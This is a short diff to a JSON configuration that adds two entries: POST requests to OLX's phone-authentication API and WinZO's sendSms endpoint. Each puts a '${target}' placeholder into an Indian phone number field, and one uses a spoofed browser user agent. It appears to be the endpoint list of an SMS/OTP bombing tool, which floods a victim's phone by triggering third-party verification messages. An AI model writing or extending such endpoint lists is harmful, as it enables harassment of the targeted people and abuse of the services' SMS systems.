@@ -79,9 +79,26 @@
         }
     },
     "8": {
-        "url": "",
-        "method": "",
+        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+            "Accept": "*/*"
+        },
+        "data": {
+            "grantType": "phone",
+            "phone": "+91${target}",
+            "language": "en-IN"
+        }
+    },
+    "9": {
+        "url": "https://www.winzogames.com/sendSms",
+        "method": "POST",
         "headers": {},
-        "data": {}
+        "data": {
+            "templateType": "WEBSITE_SMS_REQUEST",
+            "countryCode": "91",
+            "phoneNumber": "${target}"
+        }
     }
 }
